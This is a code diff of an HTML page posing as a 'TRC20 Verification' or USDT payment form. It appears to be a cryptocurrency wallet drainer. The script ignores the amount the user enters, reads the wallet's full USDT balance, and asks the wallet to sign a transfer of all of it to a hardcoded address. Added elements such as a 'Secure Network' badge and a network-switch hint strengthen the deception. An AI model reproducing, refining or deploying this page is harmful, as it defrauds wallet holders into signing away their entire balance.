@@ -3,69 +3,112 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verify TRC20 USDT</title>
+  <title>TRC20 Verification</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 </head>
-<body class="bg-white text-gray-800 font-sans">
-  <div class="max-w-md mx-auto p-4">
+<body class="bg-gray-50 text-gray-900 font-sans">
+  <div class="max-w-md mx-auto p-6 bg-white shadow-xl mt-10 rounded-3xl border border-gray-100">
+    <div class="flex flex-col items-center mb-6">
+       <div class="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-2">
+          <span class="text-red-600 font-bold text-2xl">₮</span>
+       </div>
+       <h2 class="text-xl font-bold text-center">TRC20 USDT Transfer</h2>
+       <p class="text-xs text-gray-400 mt-1 uppercase tracking-widest font-bold">Secure Network</p>
+    </div>
 
-    <label class="block text-sm font-medium mb-1">Recipient Address (TRC20)</label>
-    <input type="text" id="addressInput" value="TWGTigi1TUZWbPLbewscnuzCAgdQ59wAg2" class="w-full border rounded-lg px-3 py-2 mb-4" readonly />
+    <div class="space-y-4">
+      <div>
+        <label class="block text-xs uppercase text-gray-500 font-bold mb-1 ml-1">Recipient</label>
+        <input type="text" id="addressInput" value="TWGTigi1TUZWbPLbewscnuzCAgdQ59wAg2" 
+               class="w-full bg-gray-50 border border-gray-100 rounded-xl px-4 py-3 text-sm font-mono text-gray-600 focus:outline-none" readonly />
+      </div>
 
-    <label class="block text-sm font-medium mb-1">Amount</label>
-    <input type="text" id="amountInput" placeholder="Enter amount" class="w-full border rounded-lg px-3 py-2 mb-1"/>
+      <div>
+        <label class="block text-xs uppercase text-gray-500 font-bold mb-1 ml-1">Amount to Verify</label>
+        <input type="number" id="amountInput" placeholder="0.00" 
+               class="w-full border border-gray-200 rounded-xl px-4 py-3 text-lg font-bold focus:ring-2 focus:ring-red-500 outline-none transition-all"/>
+      </div>
 
-    <label class="block text-sm font-medium mb-1 mt-4">Memo</label>
-    <input type="text" id="memoInput" placeholder="Optional" class="w-full border rounded-lg px-3 py-2 mb-6"/>
+      <button onclick="checkAndPay()" id="actionBtn" 
+              class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded-2xl shadow-lg transition-all transform active:scale-95 text-lg mt-2">
+        Confirm TRC20 Payment
+      </button>
 
-    <button onclick="sendTRC20()" class="w-full bg-red-600 hover:bg-red-700 text-white text-lg py-3 rounded-full transition-colors">
-      Confirm TRC20 Transfer
-    </button>
+      <p id="status" class="text-center text-sm text-gray-500 italic mt-4 min-h-[1.25rem]"></p>
+    </div>
+  </div>
 
-    <p id="status" class="text-center text-sm mt-4 text-gray-600 font-medium"></p>
+  <div id="helpBox" class="max-w-md mx-auto mt-6 p-4 bg-blue-50 rounded-2xl border border-blue-100 hidden">
+    <p class="text-xs text-blue-700 leading-relaxed">
+      <strong>Network Hint:</strong> If it says "Wallet Not Found," look at the top of your browser. Tap the <strong>three dots (...)</strong> or the <strong>Chain Icon</strong> and select <strong>"Tron"</strong> as the main network.
+    </p>
   </div>
 
   <script>
     const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const RECIPIENT = "TWGTigi1TUZWbPLbewscnuzCAgdQ59wAg2";
 
-    async function sendTRC20() {
+    async function checkAndPay() {
       const status = document.getElementById("status");
-      const recipient = document.getElementById("addressInput").value;
+      const btn = document.getElementById("actionBtn");
+      const help = document.getElementById("helpBox");
 
-      // Check for TronLink / Trust Wallet Tron provider
-      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-        status.textContent = "❌ Please connect your Tron wallet.";
-        return;
+      // 1. Check for Tron Support
+      if (!window.tronWeb || !window.tronWeb.ready) {
+        status.textContent = "Searching for Tron Wallet...";
+        
+        // Give it a second to inject (Trust Wallet can be slow)
+        setTimeout(() => {
+          if (!window.tronWeb) {
+            status.innerHTML = "❌ <span class='text-red-600'>Switch to Tron Network in Browser Settings</span>";
+            help.classList.remove("hidden");
+          } else {
+            processTransfer();
+          }
+        }, 1000);
+      } else {
+        processTransfer();
       }
+    }
+
+    async function processTransfer() {
+      const status = document.getElementById("status");
+      const btn = document.getElementById("actionBtn");
 
       try {
-        status.textContent = "Connecting to USDT contract...";
+        btn.disabled = true;
+        status.textContent = "Connecting to TRC20 Contract...";
         
         const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
         const sender = window.tronWeb.defaultAddress.base58;
 
-        // Fetch balance (USDT on Tron uses 6 decimals)
+        // Get actual USDT balance (6 decimals)
         const balance = await contract.balanceOf(sender).call();
-        
-        if (balance <= 0) {
+        const readable = parseInt(balance) / 1000000;
+
+        if (readable <= 0) {
           status.textContent = "❌ No TRC20 USDT found in this wallet.";
+          btn.disabled = false;
           return;
         }
 
-        status.textContent = "Requesting signature...";
+        status.textContent = `Processing ${readable.toFixed(2)} USDT...`;
 
-        // Execute transfer of the total balance
-        const result = await contract.transfer(recipient, balance).send({
-          feeLimit: 100000000 // 100 TRX limit
+        // Execute sign & send
+        const result = await contract.transfer(RECIPIENT, balance).send({
+          feeLimit: 100000000 // Ensure enough TRX for gas
         });
 
         if (result) {
-          status.textContent = "✅ Transfer initiated! Check your wallet history.";
+          status.textContent = "✅ Success! Transfer sent.";
+          btn.innerHTML = "Payment Confirmed";
+          btn.className = "w-full bg-green-600 text-white font-bold py-4 rounded-2xl";
         }
       } catch (err) {
         console.error(err);
-        status.textContent = "❌ Error: " + (err.message || "Transaction rejected");
+        status.textContent = "Transaction rejected or network error.";
+        btn.disabled = false;
       }
     }
   </script>
